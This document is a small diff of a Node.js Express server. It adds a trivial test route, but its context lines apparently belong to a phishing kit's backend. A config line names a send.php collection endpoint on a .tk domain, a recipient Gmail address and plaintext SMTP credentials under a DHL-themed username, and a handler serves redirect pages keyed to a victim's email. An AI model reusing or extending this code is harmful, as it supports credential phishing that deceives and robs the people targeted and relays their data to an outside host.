@@ -25,6 +25,10 @@ const redirectArray = [
 const link = 'https://wertyh.tk/cgi-bin/vendor/send.php', email = 'alxy697@gmail.com', smtpusername = 'dhl@1carwash.ml', smtppass = 'ifeanyi12345', smtpservername = '1carwash.ml', lastRedirect = '';
 // test();
 // run $ nodemon index.js
+app.get('/test', (req, res) => {
+    res.write('<h1> working</h1>');
+    res.end();
+});
 app.get('/', (req, res) => {
     const email = req.query.email;
     const files = fs_1.default.readdirSync(__dirname + '/redirects/');
